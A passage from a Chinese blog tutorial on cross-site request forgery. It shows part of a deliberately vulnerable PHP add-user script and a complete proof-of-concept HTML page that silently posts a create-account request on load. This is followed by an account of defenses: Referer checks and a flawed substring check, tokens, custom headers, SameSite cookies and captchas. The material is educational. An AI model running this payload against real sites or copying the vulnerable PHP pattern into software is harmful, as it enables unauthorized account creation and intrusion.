class="string">"','"</span>.$_POST[<span class="string">'password'</span>].<span class="string">"')"</span>);</span><br><span class="line">			<span class="keyword">exit</span>($_POST[<span class="string">'username'</span>].<span class="string">"添加成功"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当管理员访问了攻击者构造的CSRF页面后，会自动创建一个账号，CSRF利用代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01 Transitional&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; language&#x3D;&quot;javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">var pauses &#x3D; new Array( &quot;16&quot; );</span><br><span class="line">var methods &#x3D; new Array( &quot;POST&quot; );</span><br><span class="line">var urls &#x3D; new Array( &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;ms08067&#x2F;4.5.4&#x2F;csrf.php&quot; );</span><br><span class="line">var params &#x3D; new Array( &quot;submit&#x3D;1&amp;username&#x3D;1&amp;password&#x3D;1&quot; );</span><br><span class="line"></span><br><span class="line">function pausecomp(millis)</span><br><span class="line">&#123;</span><br><span class="line">    var date &#x3D; new Date();</span><br><span class="line">    var curDate &#x3D; null;</span><br><span class="line"></span><br><span class="line">    do &#123; curDate &#x3D; new Date(); &#125;</span><br><span class="line">    while(curDate-date &lt; millis);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function run() &#123;</span><br><span class="line">    var count &#x3D; 1;</span><br><span class="line">    var i&#x3D;0;</span><br><span class="line">        </span><br><span class="line">    for(i&#x3D;0; i&lt;count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        makeXHR(methods[i], urls[i], params[i]);</span><br><span class="line">        pausecomp(pauses[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var http_request &#x3D; false;</span><br><span class="line">function makeXHR(method, url, parameters) &#123;</span><br><span class="line">      http_request &#x3D; false;</span><br><span class="line">      if (window.XMLHttpRequest) &#123; &#x2F;&#x2F; Mozilla, Safari,...</span><br><span class="line">         http_request &#x3D; new XMLHttpRequest();</span><br><span class="line">         if (http_request.overrideMimeType) &#123;</span><br><span class="line">            http_request.overrideMimeType(&#39;text&#x2F;html&#39;);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; else if (window.ActiveXObject) &#123; &#x2F;&#x2F; IE</span><br><span class="line">         try &#123;</span><br><span class="line">            http_request &#x3D; new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">         &#125; catch (e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">               http_request &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">            &#125; catch (e) &#123;&#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if (!http_request) &#123;</span><br><span class="line">         alert(&#39;Cannot create XMLHTTP instance&#39;);</span><br><span class="line">         return false;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      &#x2F;&#x2F; http_request.onreadystatechange &#x3D; alertContents;</span><br><span class="line">      </span><br><span class="line">      if(method &#x3D;&#x3D; &#39;GET&#39;) &#123;</span><br><span class="line">            if(url.indexOf(&#39;?&#39;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">                url &#x3D; url + &#39;?&#39; + parameters;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                url &#x3D; url + &#39;&amp;&#39; + parameters;</span><br><span class="line">            &#125;</span><br><span class="line">            http_request.open(method, url, true);</span><br><span class="line">            http_request.send(&quot;&quot;);</span><br><span class="line">      &#125; else if(method &#x3D;&#x3D; &#39;POST&#39;) &#123;</span><br><span class="line">            http_request.open(method, url, true);</span><br><span class="line">            http_request.setRequestHeader(&quot;Content-type&quot;, &quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">            http_request.setRequestHeader(&quot;Content-length&quot;, parameters.length);</span><br><span class="line">            http_request.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);</span><br><span class="line">            http_request.send(parameters);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload&#x3D;&quot;run()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>此代码的作用是创建一个AJAX请求，请求的URL是<a href="http://xxx.com/csrf.php，参数是submit=1&amp;username=1&amp;password=1，从上述PHP代码中可以看到，此AJAX请求就是执行一个添加用户的操作，由于管理员已登录，所以管理员访问此链接后就会成功创建一个新用户。" target="_blank" rel="noopener">http://xxx.com/csrf.php，参数是submit=1&amp;username=1&amp;password=1，从上述PHP代码中可以看到，此AJAX请求就是执行一个添加用户的操作，由于管理员已登录，所以管理员访问此链接后就会成功创建一个新用户。</a></p>
<h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><p>目前防御CSRF攻击主要有四种策略：<br>1、验证HTTP Referer字段；<br>2、在请求地址中添加token并验证；<br>3、在HTTP头中自定义属性并验证；<br>4、Chrome浏览器端启用SameSite cookie；</p>
<h2 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h2><p>下图是由百度跳转到QQ邮箱页面的Referer查看示意<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/121001.gif" alt=""><br>​可以看出Referer为：<a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a><br>​根据HTTP协议，在HTTP有种有一个字段Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全首先页面的请求来自于同一个网站，比如访问<a href="http://bank.example/withdraw?account=bob&amp;amount=100&amp;for=Mallory，用户必须先登录bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转账请求的Referer值就会是转账按钮所在页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=100&amp;for=Mallory，用户必须先登录bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转账请求的Referer值就会是转账按钮所在页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。</a><br>​这种方法显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。<br>​然而，这种方法并非万无一失。Referer的值是由浏览器提供的，虽然HTTP协议上由明确的要求，但是每个浏览器对于Referer的具体实现可能由差别，并不能保障浏览器自身没有安全漏洞。使用验证Referer值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如IE6或FF2，目前已经有一些方法可以篡改Referer值。比如bank.example网站支持IE6浏览器，黑客完全可以把用户浏览器的Referer值设为以bank.example域名开头的地址，这样就可以通过验证，从而进行CSRF攻击。<br>​即便是使用最新的浏览器，黑客无法篡改Referer值，这种方法仍然有问题。因为Referer值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄漏到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有Referer值而认为是CSRF攻击，拒绝合法用户的访问。<br>​另外，如果Referer的判断逻辑写的不严密的话，也容易被攻破，例如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> referer=request.headers.referer;</span><br><span class="line"><span class="keyword">if</span>(referer.index0f(<span class="string">'www.bank.example'</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//pass</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果黑客的网站是<a href="http://www.bank.example.hack.com，则referer检查无效。" target="_blank" rel="noopener">www.bank.example.hack.com，则referer检查无效。</a></p>
<h2 id="验证token字段"><a href="#验证token字段" class="headerlink" title="验证token字段"></a>验证token字段</h2><p>CSRF攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户的cookie来通过安全验证。要抵御CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。<br>​这种方法要比检查Referer要安全一些，token可以在用户登录后产生并放于session之中，然后再每次请求时把token从session中拿出，与请求中的token进行对比，但这种方法的难点在于如何把token以参数的形式加入请求。对于GET请求，token将附在请求地址之后，这样URL就变成<br><a href="http://url?csrftoken=tokenvalue" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue</a><br>而对于POST请求来说，要在form的最后加上<br><input type="hidden" name="csrftoken" value="tokenvalue" /><br>该方法有一个缺点是难以保证token本身的安全。特别是在论坛之类支持用户自己发表内容的网站。由于系统也会再这个地址后面加上token，黑客可以再自己的网站上得到这个token，并马上就可以发动CSRF攻击。为了避免这一点，系统可以在添加token的时候增加一个判断，如果这个链接是链接到自己本站的，就在后面添加token，如果是通向外网则不加，不过，即使这个csrftoken不以参数的形式附加在请求之中，黑客的网站也同样可以通过Referer来得到这个token值发动CSRF攻击。这也是一些用户喜欢手动关闭浏览器Referer功能的原因。    </p>
<h2 id="HTTP头中自定义属性并验证"><a href="#HTTP头中自定义属性并验证" class="headerlink" title="HTTP头中自定义属性并验证"></a>HTTP头中自定义属性并验证</h2><p>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把他放到HTTP头中自定义的属性里。通过XMLHttpRequset这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不变，同时，通过XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。<br>​然而这种方法的局限性非常大。XMLHttpRequest请求通常用于Ajax方法中对于页面局部的异常刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行CSRF防护的遗留系统来说，要采用这种方法来进行防护，要把所有的请求都改为XMLHttpRequest请求，这样几乎要重写整个网站，这代价无疑是不能接受的。</p>
<h2 id="Chrome浏览器启用Samesite-cookie"><a href="#Chrome浏览器启用Samesite-cookie" class="headerlink" title="Chrome浏览器启用Samesite cookie"></a>Chrome浏览器启用Samesite cookie</h2><p>下面介绍如何启用Samesite cookie的设置<br>原本的cookie的header设置时这样：<br><code>Set-Cookie:session_id=esadfas325</code><br>需要在维护增加SameSite就好：<br><code>Set-Cookie:session_id=esadfas32e5;SameSite</code><br>SameSite有两种模式，Lax跟Strict模式，默认启用Strict模式，可以自己指定模式。<br><code>Set-Cookie:session_id=esadfas32e5;SameSite=Strict</code><br><code>Set-Cookie:foo=bar;SameSite=Lax</code><br>        Strict模式规定，cookie只允许相同的site使用，不应该在任何的cross site request被加上去。即a标签，from表单和XMLHttpRequest提交的内容，只要是提交到不同的site去，就不会带上cookie。但也存在不变，例如朋友发送过来我已经登录过的一个页面链接，我点开后，该页面仍然需要重新登录。<br>        有两种处理方法，第一种是与Amazon一样，准备两组不同的cookie，第一组用于维持登录状态不设定SameSite，第二组针对的是一些敏感操作会用到（例如购买、支付，设定账户等）严格设定SameSite。<br>        基于这个思路，就产生了SameSite的另一种模式：Lax模式。<br>        Lax模式打开了一些限制，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prerender"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        这些都会带上cookie。但是POST方法的form，或是只要POST、PUT、DELETE这些方法，就不会带上cookie。<br>​        但一定要注意将重要的请求方式改成POST，否则GET仍然会被攻击。<br>PS：该方式目前仅Chrome支持。</p>
<h2 id="其他策略"><a href="#其他策略" class="headerlink" title="其他策略"></a>其他策略</h2><p>1、尽量使用POST，限制GET<br>        GET接口太容易被拿来做CSRF攻击，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加了暴漏的可能性。<br>2、浏览器cookie策略<br>        IE6、7、8、Safari会默认拦截第三方本地cookie（Third-party Cookie）的发送。但是Firefox2、3、Opera、Chorme、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。<br>PS：Cookie分为两种，Session Cookie（在浏览器关闭后，就会失效，保存到内存里），Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，何种cookie会保存到本地）。另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。<br>3、加验证码<br>        验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。<br>4、Anti CSRF Token            </p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">他年少如歌</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chakalake.gitee.io/posts/387/">https://chakalake.gitee.io/posts/387/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chakalake.gitee.io" target="_blank">他年少如歌</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/004.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/49543/"><img class="prev-cover" data-src="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/034.webp" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Web安全|SSRF</div></div></a></div><div class="next-post pull-right"><a href="/posts/19064/"><img class="next-cover" data-src="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/027.webp" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">靶机练习|XSS之旅</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> 他年少如歌</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><meta name="generator" content="Hexo 4.2.0"></head></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/calendar.js"></script><script src="/js/languages.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":120,"height":260},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>